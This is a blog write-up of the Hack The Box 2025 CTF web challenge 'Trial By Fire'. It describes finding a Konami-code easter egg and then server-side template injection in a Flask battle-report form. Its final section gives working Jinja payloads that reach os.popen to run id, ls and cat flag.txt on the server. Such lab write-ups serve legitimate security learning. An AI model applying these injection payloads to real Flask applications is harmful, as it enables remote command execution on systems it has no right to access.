---
layout: post
title: 'Hack The Box CTF 2025: Tales from Eldoria - Web - Triral By Fire'
created-at: 2025-03-21
categories: ["Hack The Box", "WriteUp", "Cybersecurity", "Tales from Eldoria", "CTF"]
---

|Category|Name|Difficulty|Status|
|:---:|:---:|:---:|:---:|
|Web|Trial By Fire|Very Easy|Completed ✅|

> As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.

---

After running the docker image locally and accessing the website:

![Landing page](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-1.png)
![Battle with the dragon](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-2.png)

It seems to be a simple browser based game (that is essentially impossible to win).

I decided to do some exploring around the source code of the page and found this easter egg:

![Ancient Capture Device](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-3.png)

And some JS injected directly on the page:

![Injected JS - Konami code](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-4.png)

```js
import { DragonGame } from '/static/js/game.js';
import { addVisualEffects } from '/static/js/effects.js';

const game = new DragonGame();
game.init();
addVisualEffects(game);

// Konami code sequence to reveal the leet (Ancient Capture Device) button
// const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
const konamiCode = ['ArrowUp'];
let konamiIndex = 0;

document.addEventListener('keydown', (e) => {
    if (e.key === konamiCode[konamiIndex]) {
    konamiIndex++;
    if (konamiIndex === konamiCode.length) {
        document.querySelector('.leet').classList.remove('hidden');
        konamiIndex = 0;
    }
    } else {
    konamiIndex = 0;
    }
});
```

After typing the [Konami Code](https://en.wikipedia.org/wiki/Konami_Code) during the battle, a new option appears where a Pokeball is thrown at the dragon 😂.

![Konami code - Pokeball](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-5.png)

And this shows up in the battle log:

![Battle log](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-6.png)

> At this moment this seemed odd to me, but I kept going through other things on the page that caught my eye as well.

I then looked a bit through the game's code that can be found on the browser sources tab, but didn't see anything out of the ordinary.

After some time I decided to look up the printed `{{ "{{ url_for.__globals__ " }}}}` output. It seems that this is from a template language used on [Flask applications](https://flask.palletsprojects.com/en/stable/templating/#jinja-setup).

I also realized that after you die, the battle data is sent through POST to a report page:

![Battle Report page](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-7.png)

I could also find this request being made from the game code:

```js
...
submitBattleReport(outcome) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/battle-report';

    const addField = (name, value) => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value;
        form.appendChild(input);
    };

    addField('damage_dealt', this.stats.damageDealt);
    addField('damage_taken', this.stats.damageTaken);
    addField('spells_cast', this.stats.spellsCast);
    addField('turns_survived', this.stats.turnsSurvived);
    addField('outcome', outcome);
    addField('battle_duration', this.stats.battleDuration);

    document.body.appendChild(form);
    form.submit();
}
...
```

After messing around with the battle report page a bit, I saw that it just renders the information that is sent by the battle screen. I then imagined that these fields could be a entry point.

I figured that since this page is also rendered by Flask, that Jinja variable replacement would also work. So I pasted the previous hint code `{{ "{{ url_for.__globals__ " }}}}` in place of one of the battle data, and for my surprise:

![Jinja template data leak](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-8.png)

I then looked for known Jinja template vulnerabilities, and found exactly what I needed on [this](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) website.

Trying out the following injection:

```python
damage_dealt={{ "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()" }}}}&damage_taken=49&spells_cast=49&turns_survived=49&outcome=victory&battle_duration=30.07
```

I got back:

![Shell execution - id](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-9.png)

then it was just a matter of:

```python
damage_dealt={{ "{{url_for.__globals__.__builtins__.__import__('os').popen('ls').read()" }}}}&damage_taken=49&spells_cast=49&turns_survived=49&outcome=victory&battle_duration=30.07
```

![Shell execution - ls](/docs/assets/2025-03/htb-ctf-web-trial-by-fire-10.png)

```python
damage_dealt={{ "{{url_for.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()" }}}}&damage_taken=49&spells_cast=49&turns_survived=49&outcome=victory&battle_duration=30.07
```

And with that I got back the testing flag. All I had to do now was to run the official image from the platform and execute the same steps.